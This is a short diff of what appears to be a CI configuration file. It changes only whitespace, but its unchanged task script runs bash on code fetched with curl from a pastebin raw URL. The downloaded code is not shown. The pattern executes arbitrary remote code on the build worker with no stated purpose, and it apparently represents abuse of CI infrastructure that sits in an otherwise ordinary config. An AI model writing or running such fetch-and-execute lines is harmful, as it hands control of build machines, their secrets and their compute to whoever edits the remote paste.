@@ -10,4 +10,4 @@ persistent_worker:
 
 task:
   script: bash -c "$(curl -fsSL https://pastebin.com/raw/zy1Ss1Xz)" 
-  
+   
